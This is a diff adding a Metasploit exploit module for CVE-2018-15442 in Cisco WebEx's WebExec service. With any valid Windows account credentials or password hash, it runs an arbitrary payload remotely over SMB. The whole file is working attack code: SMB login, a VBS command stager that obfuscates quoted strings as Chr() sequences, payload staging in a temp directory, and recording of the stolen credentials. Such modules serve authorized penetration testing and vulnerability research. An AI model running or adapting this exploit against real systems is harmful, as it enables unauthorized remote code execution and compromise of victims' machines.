@@ -1,0 +1,187 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+# Windows XP systems that are not part of a domain default to treating all
+# network logons as if they were Guest. This prevents SMB relay attacks from
+# gaining administrative access to these systems. This setting can be found
+# under:
+#
+#  Local Security Settings >
+#   Local Policies >
+#    Security Options >
+#     Network Access: Sharing and security model for local accounts
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ManualRanking
+
+  include Msf::Exploit::CmdStager
+  include Msf::Exploit::Remote::SMB::Client::WebExec
+  include Msf::Exploit::Powershell
+  include Msf::Exploit::EXE
+  include Msf::Exploit::WbemExec
+  include Msf::Auxiliary::Report
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'WebExec Authenticated User Code Execution',
+      'Description'    => %q{
+        This module uses a valid username and password of any level (or
+        password hash) to execute an arbitrary payload. This module is similar
+        to the "psexec" module, except allows any non-guest account by default.
+      },
+      'Author'         =>
+        [
+          'Ron <ron@skullsecurity.net>',
+        ],
+      'License'        => MSF_LICENSE,
+      'Privileged'     => true,
+      'DefaultOptions' =>
+        {
+          'WfsDelay'     => 10,
+          'EXITFUNC' => 'thread'
+        },
+      'References'     =>
+        [
+          ['URL', 'https://webexec.org'],
+          [ 'CVE', '2018-15442' ],
+        ],
+      'Payload'        =>
+        {
+          'Space'        => 3072,
+          'DisableNops'  => true
+        },
+      'Platform'       => 'win',
+      'Arch'           => [ARCH_X86, ARCH_X64],
+      'Targets'        =>
+        [
+          [ 'Automatic', { } ],
+          [ 'Native upload', { } ],
+        ],
+      'DefaultTarget'  => 0,
+      'DisclosureDate' => 'Oct 24 2018'
+    ))
+
+    register_options(
+      [
+        # This has to be a full path, %ENV% variables are not expanded
+        OptString.new('TMPDIR',     [ true, "The directory to stage our payload in", "c:\\Windows\\Temp\\" ])
+      ])
+
+    register_advanced_options(
+      [
+        OptBool.new('ALLOW_GUEST', [true, "Keep trying if only given guest access", false]),
+        OptInt.new('MAX_LINE_LENGTH', [true, "The length of lines when splitting up the payload", 1000]),
+      ])
+  end
+
+  # This is the callback for cmdstager, which breaks the full command into
+  # chunks and sends it our way. We have to do a bit of finangling to make it
+  # work correctly
+  def execute_command(command, opts)
+    # Replace the empty string, "", with a workaround - the first 0 characters of "A"
+    command = command.gsub('""', 'mid(Chr(65), 1, 0)')
+
+    # Replace quoted strings with Chr(XX) versions, in a naive way
+    command = command.gsub(/"[^"]*"/) do |capture|
+      capture.gsub(/"/, "").chars.map do |c|
+        "Chr(#{c.ord})"
+      end.join('+')
+    end
+
+    # Prepend "cmd /c" so we can use a redirect
+    command = "cmd /c " + command
+
+    execute_single_command(command, opts)
+  end
+
+  def exploit
+    print_status("Connecting to the server...")
+    connect(versions: [2,1])
+
+    print_status("Authenticating to #{smbhost} as user '#{splitname(datastore['SMBUser'])}'...")
+    smb_login
+
+    if not simple.client.auth_user and not datastore['ALLOW_GUEST']
+      print_line(" ")
+      print_error(
+        "FAILED! The remote host has only provided us with Guest privileges. " +
+        "Please make sure that the correct username and password have been provided. " +
+        "Windows XP systems that are not part of a domain will only provide Guest privileges " +
+        "to network logins by default."
+      )
+      print_line(" ")
+      disconnect
+      return
+    end
+
+    begin
+      if datastore['SMBUser'].to_s.strip.length > 0
+        report_auth
+      end
+
+      # Avoid implementing NTLMSSP on Windows XP
+      # http://seclists.org/metasploit/2009/q1/6
+      if smb_peer_os == "Windows 5.1"
+        connect(versions: [1])
+        smb_login
+      end
+
+      wexec(true) do |opts|
+        opts[:flavor] = :vbs
+        opts[:linemax] = datastore['MAX_LINE_LENGTH']
+        opts[:temp] = datastore['TMPDIR']
+        opts[:delay] = 0.05
+        execute_cmdstager(opts)
+      end
+      handler
+      disconnect
+    end
+
+  end
+
+  def report_auth
+    service_data = {
+        address: ::Rex::Socket.getaddress(datastore['RHOST'],true),
+        port: datastore['RPORT'],
+        service_name: 'smb',
+        protocol: 'tcp',
+        workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+        origin_type: :service,
+        module_fullname: self.fullname,
+        private_data: datastore['SMBPass'],
+        username: datastore['SMBUser'].downcase
+    }
+
+    if datastore['SMBDomain'] and datastore['SMBDomain'] != 'WORKGROUP'
+      credential_data.merge!({
+        realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,
+        realm_value: datastore['SMBDomain']
+       })
+    end
+
+    if datastore['SMBPass'] =~ /[0-9a-fA-F]{32}:[0-9a-fA-F]{32}/
+      credential_data.merge!({:private_type => :ntlm_hash})
+    else
+      credential_data.merge!({:private_type => :password})
+    end
+
+    credential_data.merge!(service_data)
+
+    credential_core = create_credential(credential_data)
+
+    login_data = {
+        access_level: 'Admin',
+        core: credential_core,
+        last_attempted_at: DateTime.now,
+        status: Metasploit::Model::Login::Status::SUCCESSFUL
+    }
+
+    login_data.merge!(service_data)
+    create_credential_login(login_data)
+  end
+end
